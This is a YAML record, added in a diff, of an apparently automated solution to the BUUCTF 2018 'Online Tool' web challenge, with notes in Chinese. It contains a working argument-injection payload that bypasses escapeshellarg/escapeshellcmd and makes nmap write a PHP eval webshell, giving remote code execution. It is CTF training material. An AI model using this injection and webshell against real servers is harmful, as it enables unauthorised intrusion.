@@ -1,0 +1,19 @@
+name: '[BUUCTF 2018]Online Tool'
+category: web
+keywords:
+- buuctf
+- online
+- tool
+steps:
+- '[claude] [Online Tool] escapeshellarg+escapeshellcmd 反序使用导致 `'' <?php eval($_REQUEST[1]);?>
+  -oG s.php ''` 写入 nmap -oG webshell 到沙箱目录 /0678d76ae07c2330d1b32baa05f2cb18/s.php（X-Forwarded-For:
+  1.2.3.4 时 sandbox=md5'
+- '[claude] Exploit chain（3 命令内完成）：escapeshellcmd 把 `''` 内的 `<?php ... ?>` 保留下来且末尾引号成对逃逸
+  → nmap 的 `-oG s.php` 把 payload 原样写进 grepable 输出文件 → 访问该 PHP 文件即得 RCE。'
+- Native Worker completed a bounded evidence-backed observation
+evidence_chain:
+- '[claude] Exploit chain（3 命令内完成）：escapeshellcmd 把 `''` 内的 `<?php ... ?>` 保留下来且末尾引号成对逃逸
+  → nmap 的 `-oG s.php` 把 payload 原样写进 grepable 输出文件 → 访问该 PHP 文件即得 RCE。'
+success_format: CTF2\{[^}]+\}
+source: e3613e67-8344-4d61-ac04-ec2f58bdf358 (solver e0ab69ff-9f21-43da-b5a8-f9fe4088b38c)
+notes: ''
